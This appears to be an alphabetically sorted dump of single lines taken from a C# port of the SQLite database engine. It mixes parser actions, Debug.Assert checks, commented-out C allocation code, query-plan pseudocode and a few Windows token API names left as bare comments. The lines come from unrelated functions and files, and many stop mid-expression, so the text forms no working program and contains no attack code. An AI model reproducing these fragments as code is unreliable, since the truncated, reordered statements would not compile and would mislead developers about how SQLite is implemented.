          { yygotominor.yy186 = yymsp[0].minor.yy186
          { yygotominor.yy3 = yymsp[0].minor.yy3
          { yygotominor.yy328 = (yymsp[-1].minor.yy328 
          { yygotominor.yy328 = 0
          { yygotominor.yy328 = 1
          { yygotominor.yy328 = JT_INNER
          { yygotominor.yy328 = OE_Abort
          { yygotominor.yy328 = OE_Cascade
          { yygotominor.yy328 = OE_Default
          { yygotominor.yy328 = OE_Fail
          { yygotominor.yy328 = OE_Ignore
          { yygotominor.yy328 = OE_None
          { yygotominor.yy328 = OE_Replace
          { yygotominor.yy328 = OE_Restrict
          { yygotominor.yy328 = OE_Restrict 
          { yygotominor.yy328 = OE_Rollback
          { yygotominor.yy328 = OE_SetDflt
          { yygotominor.yy328 = OE_SetNull
          { yygotominor.yy328 = SQLITE_SO_ASC
          { yygotominor.yy328 = SQLITE_SO_DESC
          { yygotominor.yy328 = TK_AFTER
          { yygotominor.yy328 = TK_ALL
          { yygotominor.yy328 = TK_BEFORE
          { yygotominor.yy328 = TK_DEFERRED
          { yygotominor.yy328 = TK_INSTEAD
          { yygotominor.yy328 = yymsp[0].major
          { yygotominor.yy328 = yymsp[0].minor.yy328
          { yygotominor.yy346 = new ExprSpan()
          { yygotominor.yy346 = yymsp[0].minor.yy346
          { yygotominor.yy346.pExpr = yymsp[-1].minor.yy346.pExpr
          { yygotominor.yy378.a = TK_UPDATE
          { yygotominor.yy378.a = yymsp[0].major
          { yygotominor.yy408 = null
          { yygotominor.yy408 = yymsp[-1].minor.yy408
          { yygotominor.yy429.value = 0
          { yygotominor.yy429.value = yymsp[0].minor.yy328
          { yygotominor.yy429.value = yymsp[0].minor.yy328 << 16
          { yygotominor.yy429.value = yymsp[0].minor.yy328 << 8
          { yygotominor.yy476.pLimit = null
          { yygotominor.yy476.pLimit = yymsp[-2].minor.yy346.pExpr
          { yygotominor.yy476.pLimit = yymsp[0].minor.yy346.pExpr
          { yygotominor.yy476.pOffset = yymsp[-2].minor.yy346.pExpr
          { yygotominor.yy65 = new SrcList()
          { yygotominor.yy65 = null
          { yygotominor.yy96.eOperator = yymsp[0].minor.yy0
          {}
          }
          } p.z = null
          } while ( token == TK_SPACE )
          } while (nFin != 0 
          } while (pCur.aiIdx[pCur.iPage] >= pCur.apPage[pCur.iPage].nCell)
         ( IsVirtual( pTab )
         (t1 LEFT OUTER JOIN t2) JOIN t3
         (t1 LEFT OUTER JOIN t2) WHERE t2.x>0
         (t1.X <op> <expr>) OR (t1.Y <op> <expr>) OR ....
         -- always exists under C
         /
         A = 0xxxxxxx    7 bits of data and one flag bit
         AS => nothing 
         B = 1xxxxxxx    7 bits of data and one flag bit
         BY => ID 
         C = xxxxxxxx    8 bits of data
         EOF <- 0
         EOF <- 1
         ID => nothing 
         IF => ID 
         LP => nothing 
         N may be zero if there are inequality constraints.
         OF => ID 
         PTF_LEAFDATA 
         PTF_ZERODATA
         PTF_ZERODATA 
         RP => nothing 
         TO => nothing 
         The WHERE clause may contain zero or more equality
         This case is also used when there are no WHERE clause
         X <- A
         abc[
         and TABLE.
         associated with the backup operation. 
         cc '-Du32PTR_TYPE=long long int' ...
         cleanup
         cleanup after the SELECT
         close cursors
         column MATCH expr
         column that immediately follows the N equalities. Only
         contains only tab2 in its FROM clause
         element of the FROM clause.
         end foreach
         end loop
         faster than the library printf for SUN OS 4.1.
         fill pTabList.a[].x.pSelect with a copy of the SELECT statement
         foreach index on <table>
         goto A
         goto B
         goto C
         goto L
         halt-error
         if EOF goto D
         if EOF goto M
         if( b ) a[10] = 9
         insert row from R..R
         insert the select result into <table> from R..R
         int 
         int processId)
         least one.
         left-most columns of the index. It may also contain
         loop over the rows in the SELECT
         loop over the tables in the SELECT
         of the view.
         on joins and the ON and USING clause of joins.
         open a write cursor to <table>
         open read cursor on <table2>
         open write cursor to <table> and its indices
         optimized:
         or LIMIT clause.
         puts VALUES clause expressions onto the stack
         rewind temp table
         same indices and constraints
         sqlite_vfs Delegates
         statement so that we can freely modify or delete that statement
         t1 LEFT OUTER JOIN (SELECT 
         t1 LEFT OUTER JOIN (t2 JOIN t3)
         that implements the view.  A copy is made of the view's SELECT
         the right-most column can be an inequality - the rest must
         the x=5 term:
         to force the output order to conform to an ORDER BY.
         transfer all records in <table2> over to <table>
         vsprintf.  This module adds the following:
         without worrying about messing up the presistent representation
         write the resulting record into <table>
         yield X
        !( pPager.journalMode == PAGER_JOURNALMODE_MEMORY ) 
        !pParse->pNewTable->pSelect 
        (
        ( enc == SQLITE_UTF16BE 
        ( tr_tm == TK_BEFORE ) 
        (Originally ticket 
        (SQLITE_MAX_PAGE_SIZE < 32768 
        (See ticket 
        (pParse->pNewTable->tabFlags 
        (ppPage).isInit = 0
        (void)sqlite3SafetyOff(db)
        (void)sqlite3SafetyOn(db)
        )
        ) 
        -----------------------
        /
        //
        //       
        //        
        //           
        //                                       n
        //                       sizeof(pLevel.u._in.aInLoop[0])
        //                [ sqlite3GlobalConfig.szPage
        //                [ sqlite3GlobalConfig.szScratch
        //             nCursor 
        //        Debug.Assert(pKey.aSortOrder[nCol] == 
        //        free(zConverted)
        //        freeTempSpace(pBt)
        //        if (sqlite3IsNumericAffinity(aff1) 
        //      if ( db.mallocFailed != 0 ) goto no_mem
        //      while( zEnd>zCol 
        //     sizeof(
        //     sqlite3GlobalConfig.m.xFree(p)
        //    Mem nullMem
        //    bytesPerSector = SQLITE_DEFAULT_SECTOR_SIZE
        //    if( pzErrMsg ){
        //    int iSize = sqlite3MallocSize(p)
        //    rc = SQLITE_NOMEM
        //    sqlite3_mutex_enter(mem0.mutex)
        //    sqlite3_mutex_leave(mem0.mutex)
        //    z1[i] = (char)sqlite3Tolower( z1[i] )
        //    zEnd-- = '
        //   NULL
        //  )
        //  //db.mallocFailed = 0
        //  Debug.Assert(i>=0 
        //  Debug.Assert(mem0.nScratchFree< (u32)sqlite3GlobalConfig.nScratch )
        //  DeleteFileW(zConverted)
        //  SQLITE_SKIP_UTF8( ref z )
        //  SQLITE_SKIP_UTF8( ref z2 )
        //  allocSpace( (char
        //  assert( 0==(1
        //  break
        //  char 
        //  char zEnd = zCol[pColDef.n-1]
        //  for ( i = 0 
        //  for(i=0
        //  free(zConverted)
        //  goto btree_open_out
        //  goto no_mem
        //  goto select_end
        //  i /=  sqlite3GlobalConfig.szScratch
        //  i = (int)((u8
        //  if ( !dwRet )
        //  if ( nByte )
        //  if (!rc 
        //  if(  sqlite3GlobalConfig.bMemstat ){
        //  if( aNew==0 ){
        //  if( p !=null){
        //  if( wtFlags 
        //  int i
        //  int nByte = (wsdAutoext.nExt
        //  mem0.aPageFree = (u32
        //  mem0.aScratchFree = (u32
        //  mem0.aScratchFree[mem0.nScratchFree
        //  mem0.nScratchFree =  sqlite3GlobalConfig.nScratch
        //  nByte = 0
        //  p1--
        //  pIdx = -1
        //  pWC.a = pOld
        //  ptr[0] = ptr[-2]
        //  ptr[1] = ptr[-1]
        //  rc = CloseHandle(pFile.h)
        //  rc = SQLITE_NOMEM
        //  ret = null
        //  return
        //  return 0
        //  return SQLITE_NOMEM
        //  return WRC_Abort
        //  return pArray
        //  sqlite3GlobalConfig.szScratch = ROUNDDOWN8(sqlite3GlobalConfig.szScratch-4)
        //  sqlite3_free(ref pKey)
        //  sqlite3_mutex_enter(mem0.mutex)
        //  sqlite3_mutex_leave(mem0.mutex)
        //  sqlite3_result_error_nomem( context )
        //  staticFlag = EP_Static
        //  void 
        //  zAlloc = new Expr()
        //  zAlloc = pzBuffer
        //  zCsr = p.pFree
        //  zEnd = 
        //  {
        //  }
        //  }else{
        // AdjustTokenPrivileges
        // C
        // Constants that are going to be used during our procedure.
        // DuplicateToken
        // GetCurrentProcess
        // LookupPrivilegeValue
        // Luid Structure Definition
        // OpenProcess
        // OpenProcessToken
        // Return number of colums read
        // SetThreadToken
        // TODO -- Determine if the following Assert is needed under c
        // free(zConverted)
        // free(zTemp)
        // memset(
        // pPager.aSavepoint = aNew
        // pointer to database
        // private function for creating Column Names
        // private function for reading rows and creating table and columns
        // retry opening the file a few times
        // will happen on exit
        // }
        //(char)sqlite3Toupper( z1[i] )
        //(int)( pSpan.zEnd- pSpan.zStart) )
        //)
        /// </summary>
        /// <returns></returns>
        /// <summary>
        /// Closes opened database.
        /// Creates new instance of SQLiteBase class with no database attached.
        /// Creates new instance of SQLiteDatabase class and opens database with given name.
        /// Executes query that does return something (e.g. SELECT).
        /// Opens database. 
        /// Returns connection
        /// Returns the list of tables in opened database.
        ////if ( 0 == db.mallocFailed )
        ////sqlite3_free( ref db.lookaside.pStart )
        ////sqlite3_free(ref  elem )
        //Debug.Assert( 0 == db.mallocFailed )
        //Debug.Assert( db.mallocFailed != 0 )
        //Debug.Assert( db.mallocFailed == 0 )
        //Debug.Assert( pMem.zMalloc )
        //Debug.Assert( pPage.pExtra == (void
        //Debug.Assert( pParse.db.mallocFailed != 0 )
        //Debug.Assert( pPayload < pPage.aData 
        //Debug.Assert( sizeof( u64 ) == 8 )
        //Debug.Assert( sizeof( u64 ) == sizeof( double ) )
        //Debug.Assert( sqlite3IsNaN( y ) )
        //Debug.Assert(p == pColl)
        //Debug.Assert(pPage.intKey != 0)
        //MemPage pOld = apCopy[i] = (MemPage
        //WhereTerm pOld = pWC.a
        //aNew = (PagerSavepoint 
        //aPayload 
        //allocateTempSpace(pBt)
        //assert( EIGHT_BYTE_ALIGNMENT( zCsr ) )
        //byte[] pTmp
        //char 
        //db.aDb = db.aDbStatic
        //db.mallocFailed = 0
        //do
        //double y
        //else
        //else if ( p.rc != 0 )
        //else if ( pAccum.mallocFailed != 0 )
        //else{
        //extern int sqlite3_search_count
        //for ( i = 0 
        //for ( z2 = z 
        //freeTempSpace(pBt)
        //h = CreateFileA((char
        //h = CreateFileW((WCHAR
        //if ( /
        //if ( db.mallocFailed != 0 )
        //if ( nAlloc < z.Length )
        //if ( null == p )
        //if ( p.zErrMsg != 0 ) // Always exists under C
        //if ( pFrom != null )
        //if ( pList == null ) return null
        //if ( pzBuffer !=null)
        //if ( z1 !=null)
        //if ( z1 )
        //if (n == 0) n =  n = sqlite3Strlen30(zP4)
        //if (pNew == 0)
        //if (pzErrMsg)
        //if(  sqlite3GlobalConfig.pScratch==null
        //if( a==0 ){
        //if( aNew==0 ){
        //if( i==wsdAutoext.nExt ){
        //if( null==aNew ){
        //if( pBt==null ){
        //if( pKey !=null){
        //if( pOld!=pWC.aStatic ){
        //if( pWC.a==null ){
        //if( pzErrMsg != null){
        //if( rc==SQLITE_NOMEM 
        //if( zErrmsg !=null){
        //if( zExtra ){
        //if( zTemp==0 ){
        //int (
        //int nErrMsg = 1 
        //k 
        //len = 0
        //memcpy(
        //memcpy( 
        //memset(
        //memset(hit
        //nByte = sizeof(
        //p -= 2
        //pArray = pNew
        //pBest.zName = (char 
        //pBest.zName[nName] = 0
        //pIn = pLevel.u._in.aInLoop
        //pItem = new ExprList_item()
        //pMem
        //pMem.zMalloc = null
        //pMem.zMalloc = pMem.z = (char
        //pMem.z[amt
        //pMem.z[amt] = 0
        //pMem.z[pMem->n 
        //pMem.z[pMem->n] = 0
        //pOld.aData = (void
        //pPager.zJournal =   (char
        //pParse->sLastToken.z = 
        //pSrc->nAlloc = (u16)nGot
        //pTerm
        //pTmp = pBt.pTmpSpace
        //pzErrMsg = sqlite3Malloc(nErrMsg)
        //rc = SQLITE_NOMEM
        //rc = sqlite3MallocInit()
        //sizeof(
        //sqlite3MallocEnd()
        //sqlite3_free( ref  pOld )
        //sqlite3_free( ref p )
        //sqlite3_free( ref p.apHash )
        //sqlite3_free( ref pIndex.zColAff )
        //sqlite3_free( ref pPager )
        //sqlite3_free( ref pTmp )
        //sqlite3_free( ref sqlite3Autoext.aExt )
        //sqlite3_free( ref zBuf )
        //sqlite3_free( ref zMasterJournal )
        //sqlite3_free( ref zPathname )
        //sqlite3_free(ref pCur.pKey)
        //string zTemp
        //testcase( p.mallocFailed )
        //u64 x = ( ( (u64)1 ) << 63 ) - 1
        //u8 
        //u8 malloc_failed =  db.mallocFailed
        //u8 zCsr = (u8)p.aOp[p.nOp]
        //u8 zEnd = (u8)p.aOp[p.nOpAlloc]
        //void
        //void 
        //z1 = new byte[n]
        //zBlob[i / 2] = '
        //zBuf[k
        //zColAff.Append( '
        //zCsr 
        //zExtra = null
        //zOut = sqlite3_win32_mbcs_to_utf8(zTemp)
        //zTemp = malloc( nByte
        //z[j] = 0
        //{
        //{ pMem.z = new byte[nAlloc]
        //}
        //} while ( nByte 
        //}else{
        //}while(   (   ((rc = GetFileAttributesW(zConverted)) != INVALID_FILE_ATTRIBUTES)
        0 == ( sqlite3OsDeviceCharacteristics( pPager.fd ) 
        1 : SQLITE_MAX_FILE_FORMAT
        A = (int)( ( Z - 1867216.25 ) / 36524.25 )
        A = Z 
        ALWAYS( pChunk != null ) 
        ANALYZE  
        ANALYZE                            -- 1
        ANALYZE  <database>                -- 2
        ASC => ID 
        Alice       
        AutoincInfo p = pParse.pAinc
        AutoincInfo pInfo
        AuxData pAux = pVdbeFunc.apAux[i]
        B = A 
        Bitmask m
        Bitmask toTheLeft = 0
        Bob         
        BtCursor cp = (BtCursor)MemberwiseClone()
        BtCursor pTmp = pCur
        BtShared pBt
        BtShared pBt = p.pBt
        BtShared pBt = pCur.pBt
        BtShared pBt = pFrom.pBt
        Btree p = db.aDb[i].pBt
        Btree pBt = db.aDb[iDb].pBt
        Btree pBt = db.aDb[i].pBt
        Btree pBt = db.aDb[j].pBt
        Btree pBtree = db.aDb[iDb].pBt
        Buffer.BlockCopy(apCell[offset 
        Buffer.BlockCopy(pPage.aOvfl[-(iCell 
        C = (int)( ( B - 122.1 ) / 365.25 )
        CellInfo info = new CellInfo()
        Cindy       
        CollSeq apColl
        CollSeq pColl
        CollSeq pColl = sqlite3GetFuncCollSeq( context )
        CollSeq[] pColl = (CollSeq[])i.data
        Column cp = (Column)MemberwiseClone()
        Column pCol = pTab.aCol[i]
        Column pCol = pTab.aCol[i].Copy()
        Column pTabCol
        D = (int)( ( 36525 
        D = 1
        D = p.D
        DISTINCT.
        DateTime x = new DateTime()
        Db pDb
        Db pDb = db.aDb[iDb]
        Db pDb = db.aDb[i]
        Db pDb = db.aDb[j]
        Db pDb = db.aDb[p.iDb]
        DbPage pDestPg = null
        DbPage pNew = null
        DbPage pOvflPage = new PgHdr()
        Debug.Assert(
        Debug.Assert( !IsVirtual( pTab ) )
        Debug.Assert( !String.IsNullOrEmpty( z ) )
        Debug.Assert( !isDistinct )
        Debug.Assert( !isOpen( pJournal ) )
        Debug.Assert( !isView )
        Debug.Assert( !pPager.dbModified )
        Debug.Assert( !pPager.doNotSync )
        Debug.Assert( !pPager.tempFile 
        Debug.Assert( !pPager.tempFile )
        Debug.Assert( !useTempTable )
        Debug.Assert( ( WO_EQ << ( op - TK_EQ ) ) < 0x7fff )
        Debug.Assert( ( _p4.pVtab ).db == p.db )
        Debug.Assert( ( db.flags 
        Debug.Assert( ( fg 
        Debug.Assert( ( mem1.flags 
        Debug.Assert( ( notReady 
        Debug.Assert( ( p.flags2 
        Debug.Assert( ( p.selFlags 
        Debug.Assert( ( pDest.tabFlags 
        Debug.Assert( ( pDup.flags 
        Debug.Assert( ( pExpr.flags 
        Debug.Assert( ( pLevel.plan.wsFlags 
        Debug.Assert( ( pMem.flags 
        Debug.Assert( ( pPg.flags 
        Debug.Assert( ( pTerm.wtFlags 
        Debug.Assert( ( pVal.flags 
        Debug.Assert( ( pg1 
        Debug.Assert( ( rc 
        Debug.Assert( /
        Debug.Assert( 0 == ( pMem.flags 
        Debug.Assert( 0 == isSavepnt )
        Debug.Assert( 0 == pItem.notIndexed 
        Debug.Assert( MAX_SECTOR_SIZE >= 512 )
        Debug.Assert( TK_GE == TK_LE 
        Debug.Assert( TK_GT < TK_LE )
        Debug.Assert( TK_GT > TK_EQ )
        Debug.Assert( TK_LT == TK_GT 
        Debug.Assert( aff1 == 0 
        Debug.Assert( affinity == SQLITE_AFF_INTEGER 
        Debug.Assert( autoInc == 0 
        Debug.Assert( db.aDb[1].pSchema != null )
        Debug.Assert( db.aDb[iDb].pBt != null 
        Debug.Assert( db.aDb[iDb].pSchema == pTab.pSchema )
        Debug.Assert( db.activeVdbeCnt >= db.writeVdbeCnt )
        Debug.Assert( db.init.busy != 0 )
        Debug.Assert( db.init.iDb == 0 
        Debug.Assert( db.mutex != null 
        Debug.Assert( db.nStatement > 0 )
        Debug.Assert( db.pVdbe == p )
        Debug.Assert( dest.nMem == nColumn )
        Debug.Assert( eOp == SAVEPOINT_ROLLBACK 
        Debug.Assert( enc != 0 )
        Debug.Assert( i < pTab.nCol )
        Debug.Assert( i >= 0 
        Debug.Assert( i >= 0 )
        Debug.Assert( iDb < SQLITE_MAX_ATTACHED 
        Debug.Assert( iDb < db.nDb )
        Debug.Assert( iDb >= 2 )
        Debug.Assert( iSortOrder == 0 
        Debug.Assert( iTrigDb == iDb 
        Debug.Assert( idx1 == szHdr1 
        Debug.Assert( isAgg 
        Debug.Assert( isOpen( pPager.fd ) 
        Debug.Assert( isSavepnt != 0 )
        Debug.Assert( k <= n )
        Debug.Assert( len <= (u32)nBuf )
        Debug.Assert( len == zBLOB.Length )
        Debug.Assert( length == SHARED_SIZE )
        Debug.Assert( n > 3 
        Debug.Assert( nLocal <= nKey )
        Debug.Assert( nOrderBy >= nExpr /
        Debug.Assert( nPage > 0 )
        Debug.Assert( nReserve >= 0 
        Debug.Assert( null == pPager.pTmpSpace )
        Debug.Assert( null == pTrigger )
        Debug.Assert( offset == SHARED_FIRST )
        Debug.Assert( omitTable == 0 )
        Debug.Assert( onError == OE_Rollback 
        Debug.Assert( once != 0 )
        Debug.Assert( op != 0 )
        Debug.Assert( p.aMem[n].db == db )
        Debug.Assert( p.iStatement == ( db.nStatement 
        Debug.Assert( p.isTable )
        Debug.Assert( p.nOp > 0 )
        Debug.Assert( p.pEList != null )
        Debug.Assert( p.pEntry == null )
        Debug.Assert( p.pRight == null 
        Debug.Assert( p.pRightmost == p )
        Debug.Assert( p.pSchema != null )
        Debug.Assert( p.pSchema == p.pTabSchema 
        Debug.Assert( p.pTabSchema != null )
        Debug.Assert( p.rc != SQLITE_IOERR_BLOCKED )
        Debug.Assert( pA.pRight == null 
        Debug.Assert( pB != null )
        Debug.Assert( pB == null 
        Debug.Assert( pB.pRight == null 
        Debug.Assert( pBuf.Length >= amt )
        Debug.Assert( pCol.affinity - SQLITE_AFF_TEXT < azType.Length )
        Debug.Assert( pCol.affinity - SQLITE_AFF_TEXT >= 0 )
        Debug.Assert( pCol.affinity == SQLITE_AFF_NONE
        Debug.Assert( pColl == null 
        Debug.Assert( pDb != null )
        Debug.Assert( pDest.eDest == SRT_Exists 
        Debug.Assert( pDest.nMem == nResultCol )
        Debug.Assert( pE != null )
        Debug.Assert( pE.op != TK_DOT 
        Debug.Assert( pEList != null )
        Debug.Assert( pEList.nExpr == nColumn )
        Debug.Assert( pEntry.count >= 0 )
        Debug.Assert( pExpr.op >= TK_GT 
        Debug.Assert( pExpr.pRight == null )
        Debug.Assert( pExpr.pTab != null 
        Debug.Assert( pExpr.u.zToken[0] == 'x' 
        Debug.Assert( pExpr.u.zToken[1] == '
        Debug.Assert( pFile.locktype == NO_LOCK )
        Debug.Assert( pFile.locktype == SHARED_LOCK )
        Debug.Assert( pFile.locktype >= SHARED_LOCK )
        Debug.Assert( pFunc.nArg == -1 
        Debug.Assert( pH.count == 0 )
        Debug.Assert( pH.first == null )
        Debug.Assert( pIdx.aSortOrder != null )
        Debug.Assert( pIdx.pSchema == pTab.pSchema )
        Debug.Assert( pIndex.pSchema == pTable.pSchema )
        Debug.Assert( pItem.zName == null )
        Debug.Assert( pLeft.pColl != null )
        Debug.Assert( pList != null )
        Debug.Assert( pList == null )
        Debug.Assert( pList.nAlloc == 0 )
        Debug.Assert( pList.nExpr == 2 )
        Debug.Assert( pList.nExpr > 0 )
        Debug.Assert( pMatch.iCursor == pExpr.iTable )
        Debug.Assert( pMem.db == null 
        Debug.Assert( pMem.n 
        Debug.Assert( pMem.n <= nBuf )
        Debug.Assert( pMem.u.pRowSet != null )
        Debug.Assert( pMem.z != null )
        Debug.Assert( pMem1.enc == SQLITE_UTF8 
        Debug.Assert( pMem1.enc == pMem2.enc )
        Debug.Assert( pNC != null )
        Debug.Assert( pName == null )
        Debug.Assert( pName1 != null 
        Debug.Assert( pName1.z != null )
        Debug.Assert( pNew != null )
        Debug.Assert( pNew == null )
        Debug.Assert( pOp != null )
        Debug.Assert( pOrderBy == null )
        Debug.Assert( pOther != pDef 
        Debug.Assert( pPage == p.pDirty )
        Debug.Assert( pPage == p.pDirtyTail )
        Debug.Assert( pPage.pCache == pCache )
        Debug.Assert( pPage.pDirtyNext.pDirtyPrev == null )
        Debug.Assert( pPage.pgno == pgno )
        Debug.Assert( pPager.dbOrigSize == 0 )
        Debug.Assert( pPager.doNotSync )
        Debug.Assert( pPager.exclusiveMode 
        Debug.Assert( pPager.journalOff == JOURNAL_HDR_SZ( pPager ) )
        Debug.Assert( pPager.memDb == 0 )
        Debug.Assert( pPager.nRec == 0 )
        Debug.Assert( pPager.nSavepoint == 0 
        Debug.Assert( pPager.nSavepoint > 0 )
        Debug.Assert( pPager.needSync )
        Debug.Assert( pPager.noSync == false 
        Debug.Assert( pPager.pInJournal == null )
        Debug.Assert( pPager.state >= SHARED_LOCK )
        Debug.Assert( pPager.tempFile 
        Debug.Assert( pPager.tempFile )
        Debug.Assert( pParse.iCacheLevel == 0 )
        Debug.Assert( pParse.nErr == 0 
        Debug.Assert( pParse.pNewTrigger == pTrigger )
        Debug.Assert( pParse.pVdbe != null )
        Debug.Assert( pPgHdr == null 
        Debug.Assert( pRight.pColl != null )
        Debug.Assert( pSchema != null )
        Debug.Assert( pSelect.pEList != null )
        Debug.Assert( pSrc.a != null )
        Debug.Assert( pSrc.nSrc > 0 )
        Debug.Assert( pSrcIdx != null )
        Debug.Assert( pTab != null )
        Debug.Assert( pTab.dbMem == null )
        Debug.Assert( pTerm != null )
        Debug.Assert( pTerm.leftCursor == iCur )
        Debug.Assert( pTerm.pExpr != null )
        Debug.Assert( pTerm.sortOrder == 0 
        Debug.Assert( pWC.op == TK_AND )
        Debug.Assert( pX.op == TK_IN )
        Debug.Assert( pageInJournal( pPg ) 
        Debug.Assert( pageSize == 0 
        Debug.Assert( pc >= -1 
        Debug.Assert( pc >= 0 
        Debug.Assert( pcache1.isInit != 0 )
        Debug.Assert( pg1 <= pPg.pgno )
        Debug.Assert( ppStmt == null )
        Debug.Assert( pzBuffer == null 
        Debug.Assert( pzOriginTab != null 
        Debug.Assert( rc != SQLITE_DONE )
        Debug.Assert( rc != SQLITE_OK 
        Debug.Assert( rc == SQLITE_NOMEM 
        Debug.Assert( rc == SQLITE_OK 
        Debug.Assert( scratchAllocOut == 1 )
        Debug.Assert( sqlite3BtreeIsInTrans( pMain ) )
        Debug.Assert( sqlite3BtreeIsInTrans( pTemp ) )
        Debug.Assert( sqlite3GlobalConfig.nRefInitMutex == 0 )
        Debug.Assert( sqlite3PcacheRefCount( pPager.pPCache ) == 0 )
        Debug.Assert( sqlite3_mutex_held( db.mutex ) )
        Debug.Assert( sqlite3_mutex_held( p.pSrc.pBt.mutex ) )
        Debug.Assert( sqlite3_value_type( argv[1] ) != SQLITE_NULL )
        Debug.Assert( sqlite3_value_type( argv[1] ) == SQLITE_NULL
        Debug.Assert( srcType == MEM_Ephem 
        Debug.Assert( testAddr > 0 /
        Debug.Assert( v != null )
        Debug.Assert( z != null 
        Debug.Assert( z != null )
        Debug.Assert( zToken != null )
        Debug.Assert( zVal[nVal] == '
        Debug.Assert( z[0] == '
        Debug.Assert((pBt.pageSize 
        Debug.Assert((pageSize 
        Debug.Assert(MX_CELL_SIZE(pBt) >= nCell)
        Debug.Assert(TRANS_WRITE == pBt.inTransaction)
        Debug.Assert(apNew[0].nFree ==
        Debug.Assert(cbrk 
        Debug.Assert(contentOffset <= usableSize)
        Debug.Assert(countWriteCursors(pBt) == 0)
        Debug.Assert(d < nMaxCells)
        Debug.Assert(gap 
        Debug.Assert(i < nMaxCells)
        Debug.Assert(i < nNew - 1 
        Debug.Assert(iSavepoint >= 0 
        Debug.Assert(idx 
        Debug.Assert(idx < pPage.nCell)
        Debug.Assert(idx >= end 
        Debug.Assert(j < nMaxCells)
        Debug.Assert(j < pPage.aOvfl.Length)
        Debug.Assert(lwr == upr 
        Debug.Assert(nKey == (i64)(int)nKey)
        Debug.Assert(nNew == 1)
        Debug.Assert(null == pBt.pCursor)
        Debug.Assert(null == pBt.pPage1 
        Debug.Assert(op == SAVEPOINT_RELEASE 
        Debug.Assert(pBt.inTransaction == TRANS_WRITE)
        Debug.Assert(pBt.nTransaction > 0)
        Debug.Assert(pBt.pPage1.aData != null)
        Debug.Assert(pBt.pageSize >= 512 
        Debug.Assert(pBt.usableSize > 32)
        Debug.Assert(pCur.aiIdx[pCur.iPage] < pCur.apPage[pCur.iPage].nCell)
        Debug.Assert(pCur.aiIdx[pCur.iPage] < pPage.nCell)
        Debug.Assert(pCur.aiIdx[pCur.iPage] == pCur.apPage[pCur.iPage].nCell - 1)
        Debug.Assert(pCur.apPage[0].intKey == 1 
        Debug.Assert(pCur.apPage[pCur.iPage].leaf != 0)
        Debug.Assert(pCur.apPage[pCur.iPage].nCell == 0)
        Debug.Assert(pCur.eState == CURSOR_VALID 
        Debug.Assert(pCur.eState == CURSOR_VALID)
        Debug.Assert(pCur.iPage >= 0 
        Debug.Assert(pCur.skipNext != SQLITE_OK)
        Debug.Assert(pFrom.isInit != 0)
        Debug.Assert(pFrom.nFree >= iToHdr)
        Debug.Assert(pNew.nCell > 0 
        Debug.Assert(pNew.nOverflow == 0)
        Debug.Assert(pPage.aData != null)
        Debug.Assert(pPage.aData[0] == (PTF_INTKEY 
        Debug.Assert(pPage.intKey == ((pIdxKey == null) 
        Debug.Assert(pPage.isInit != 0)
        Debug.Assert(pPage.leaf != 0)
        Debug.Assert(pPage.nCell > 0)
        Debug.Assert(pPage.nOverflow == 0 
        Debug.Assert(pPage.pBt != null)
        Debug.Assert(pPgno != PENDING_BYTE_PAGE(pBt))
        Debug.Assert(pToRelease == null 
        Debug.Assert(pbegin <= pPage.pBt.usableSize - 4)
        Debug.Assert(pbegin > addr)
        Debug.Assert(pc >= iCellFirst 
        Debug.Assert(pgnoRoot >= 3)
        Debug.Assert(r < nMaxCells)
        Debug.Assert(rc == SQLITE_CORRUPT)
        Debug.Assert(rc == SQLITE_OK 
        Debug.Assert(rc == SQLITE_OK)
        Debug.Assert(sizeof(Pgno) == 4)
        Debug.Assert(sizeof(i64) == 8 
        Debug.Assert(sizeof(u16) == 2)
        Debug.Assert(sizeof(u32) == 4)
        Debug.Assert(sizeof(u64) == 8 
        Debug.Assert(sqlite3PagerGetData(pPage.pDbPage) == pPage.aData)
        Debug.Assert(sqlite3PagerGetExtra(pPage.pDbPage) == pPage)
        Debug.Assert(sqlite3PagerIswriteable(pNew.pDbPage))
        Debug.Assert(sqlite3PagerIswriteable(pPage.pDbPage))
        Debug.Assert(sqlite3PagerRefcount(pBt.pPager) == 1)
        Debug.Assert(sqlite3_mutex_held(mutexOpen))
        Debug.Assert(sqlite3_mutex_held(pPage.pBt.mutex))
        Debug.Assert(sz == info.nPayload)
        Debug.Assert(yyact == YYNSTATE 
        Debugger.Break()
        E = (int)( ( B - D ) / 30.6001 )
        END => ID 
        Expr p
        Expr p = pEList.a[i].pExpr
        Expr pE
        Expr pE = pEList.a[k].pExpr
        Expr pE = pItem.pExpr
        Expr pExpr
        Expr pExpr = p.pEList.a[0].pExpr
        Expr pExpr = pList.a[i].pExpr
        Expr pLeft = pExpr.pLeft
        Expr pLimit = p.pLimit
        Expr pOldExpr = pOldItem.pExpr
        Expr pRight = pExpr.pRight
        Expr zAlloc = new Expr()
        ExprList elDummy = null
        ExprList pEList
        ExprList pList = pExpr.x.pList
        ExprList pList = pF.pExpr.x.pList
        ExprList pNew = null
        ExprList pOrderBy = p.pOrderBy
        ExprList_item a
        ExprList_item pItem
        ExprList_item pItem = pList.a[pList.nExpr
        ExprList_item pItem = pList.a[pList.nExpr - 1]
        ExprList_item[] a = pEList.a
        ExprSetIrreducible( p )
        ExprSetIrreducible( pE )
        FOR => ID 
        FileChunk pChunk = p.endpoint.pChunk
        FileChunk pTmp = pChunk
        FuncDefHash pHash = sqlite3GlobalFunctions
        Hash pHash = db.aDb[iDb].pSchema.trigHash
        HashElem next_elem = elem.next
        HashElem p
        I = (K
        IdList_item pNewItem = pNew.a[i]
        IdList_item pOldItem = p.a[i]
        InLoop pIn
        Index p
        Index pIdx
        Index pIdx = (Index)i.data
        Index pIdx = (Index)pElem.data
        Index pIndex
        Index pLoop
        KEY => ID 
        KeyInfo pKeyInfo
        LIMIT and OFFSET clauses.
        LookasideSlot pBuf = (LookasideSlot)p
        M 
        M = 1
        M = p.M
        Mem nullMem = new Mem()
        Mem pEnd
        MemPage cp = (MemPage)MemberwiseClone()
        MemPage pLeaf = pCur.apPage[pCur.iPage]
        MemPage pNew = apNew[i]
        MemPage pNew = new MemPage()
        MemPage pOld = apCopy[i] = apOld[i].Copy()
        MemPage pOvfl = null
        MemPage pPage
        MemPage pPage = pCur.apPage[iPage]
        MemPage pPage = pCur.apPage[pCur.iPage]
        MemPage pPageMove = new MemPage()
        N 
        N = sqlite3Strlen30( z )
        NOT => nothing 
        Name        
        NameContext sNC
        ORDER by clause of the parent must be simple references to
        Op pOp
        Op pOp = p.aOp[i]
        P4_INT32 )
        PCache pCache = p.pCache
        PGHDR1_TO_PAGE( pPage ).Clear()
        Pager pDestPager = sqlite3BtreePager( p.pDest )
